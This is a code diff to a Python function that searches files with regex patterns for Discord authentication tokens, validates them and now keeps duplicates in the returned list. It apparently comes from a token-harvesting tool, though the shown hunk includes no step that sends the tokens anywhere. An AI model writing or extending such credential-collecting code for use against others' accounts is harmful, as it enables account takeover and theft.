@@ -121,15 +121,15 @@ def get_tokens_from_file(file_path: Path) -> list[str] | None:
             tokens = re.findall(pattern, file_contents, re.IGNORECASE)
             all_tokens.extend(tokens)
         
-        # Remove duplicates and validate
-        unique_tokens = []
-        for token in set(all_tokens):
+        # Validate tokens (keeping duplicates)
+        valid_tokens = []
+        for token in all_tokens:
             if validate_discord_token(token):
-                unique_tokens.append(token)
+                valid_tokens.append(token)
         
-        log_debug(f"Found {len(unique_tokens)} valid tokens in {file_path.name}")
+        log_debug(f"Found {len(valid_tokens)} valid tokens (including duplicates) in {file_path.name}")
         
-        return unique_tokens if unique_tokens else None
+        return valid_tokens if valid_tokens else None
         
     except PermissionError:
         log_debug(f"Permission denied accessing: {file_path}")
